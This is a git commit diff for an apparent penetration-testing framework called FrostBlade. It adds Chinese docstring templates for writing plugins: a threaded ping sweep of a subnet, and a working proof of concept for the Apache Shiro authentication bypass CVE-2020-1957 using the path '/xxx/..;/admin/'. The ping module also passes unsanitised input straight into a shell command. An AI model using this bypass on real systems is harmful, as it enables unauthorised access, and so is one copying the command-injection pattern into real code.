150be788c056e6960f83d450813986aeb57e0ee2
haochen <haochen1204@aliyun.com>
2021-11-01 15:11:55 +0800

    v0.2

--- FrostBlade/modules/__init__.py
+++ FrostBlade/modules/__init__.py
@@ -40,4 +40,67 @@ class module:
         self.output = output.cmd_output()
         self.output.output_attack(self.msg,'module result')
  
+"""
+# 如何编写模块
+# 倒入你需要的包，modules必须导入
+import threading
+import subprocess
+import modules
+
+# 创建类，且类名必须为MO，必须继承module类
+class MOD(modules.module):
+
+    def __init__(self) -> None:
+        # 根据模块等名称进行定义
+        super().__init__()
+        self.module_name= 'ping扫描'
+        self.module_author = 'haochen'
+        self.module_explain = '通过ping来判断主机是否存活，可以对多个网段的特定ip进行扫描'
+        # 定义需要的参数
+        self.must_parameter={
+            'ip' : '', 
+            'thread' : '100'
+        }
+
+    # 自由发挥，但是启动的函数必须为run
+    def run(self):
+        '''     
+            运行函数      
+        '''
+        thread_num = int(self.must_parameter['thread'])
+        i = 0
+        ip = self.must_parameter['ip']
+        while True:
+            if i <= 255 and threading.active_count()-1 < thread_num:
+                tmp_ip =  ip.replace('*',str(i))
+                thread = threading.Thread(target=self.ping_ip,args=(tmp_ip,))
+                thread.start()
+                i += 1
+            if i > 255 and threading.active_count() == 1:
+                self.cout()
+                break 
+    
+    def ping_ip(self,ip): 
+        '''
+            系统执行的主要函数
+        '''                                        
+        # 执行系统ping命令，并将执行结果存放在output中
+        try:
+            output = subprocess.getoutput('ping -c 1 '+ip)
+        except Exception as e:
+            pass
+        # 从output中循环读取数据
+        #print('****' + str(output))
+        # 判断每行中是否存在TTL，存在则说明ping通，主机存活
+        #print(output)
+        if output.find('TTL')>=0 or output.find('ttl')>=0:
+            #print("[+] {0:^10} is alive".format(ip))
+            tmp_msg = []
+            tmp_msg.append('success')
+            tmp_msg.append(ip)
+            tmp_msg.append('is alive')
+            self.msg.append(tmp_msg)
+
+
+"""
     
--- FrostBlade/pocs/__init__.py
+++ FrostBlade/pocs/__init__.py
@@ -46,3 +46,65 @@ class Pocs:
         msg=[self.poc_name,self.vul_name,self.vul_num,self.author,self.app_name,self.app_version,self.msg]
         return msg
         
+"""
+如何编写poc
+# 先导入你需要的模块 pocs必须导入，config可以选择，其中有定义好的http包头，可直接使用
+import pocs
+from lib import config
+import re
+import requests
+
+# 定义类 名称不可改变，且需要继承父类Pocs
+class POC(pocs.Pocs):
+
+    def __init__(self):
+        '''
+            初始化函数
+        '''
+        # 根据漏洞的信息进行定义
+        super().__init__()
+        self.poc_name='shiro 未授权访问漏洞'
+        self.vul_name='shiro 未授权访问漏洞'
+        self.vul_num='CVE-2020-1957'
+        self.app_name='shiro'
+        self.app_version='12.x'
+        self.author='haochen'
+        self.msg='直接访问管理页面/admin/会被重定向至登陆页面，访问/xxx/..;/admin/可绕过登陆直接进入后台'
+        # 根据需要的参数进行定义，被攻击的url或ip必须定义为target
+        self.must_parameter={
+            'target' : ''
+        }
+
+    def exploit(self,must_parameter,cho_parameter):
+        '''
+            扫描使用的函数
+        '''
+        # 自由发挥
+        att_msg={}
+        # 将攻击的目标和poc名称导入
+        url = must_parameter['target']
+        att_msg['target']=url
+        att_msg['pocname'] = self.poc_name
+        self.must_parameter = must_parameter
+        head = config.Pack
+        self.payload='/xxx/..;/admin/'
+        if re.search('/$',url):
+            url=url[0:len(url)-1]
+        target = url + self.payload
+        try:
+            response = requests.get(target,headers=head)
+            # 攻击完成后需要将攻击的结果写入
+            if response.status_code == 200:
+                att_msg['status'] = 'success'
+                att_msg['msg'] = '存在漏洞'
+            else:
+                att_msg['status']='failed'
+                att_msg['msg']='不存在漏洞，网站返回值为: '+str(response.status_code) 
+                #self.set_cout('failed','不存在漏洞，网站返回值为: '+str(response.status_code) )
+        except:
+            att_msg['status']='error'
+            att_msg['msg']='无法正确访问网站'
+            #self.set_cout('error','无法正确访问网站！')
+        # 返回攻击结果信息
+        return att_msg
+"""
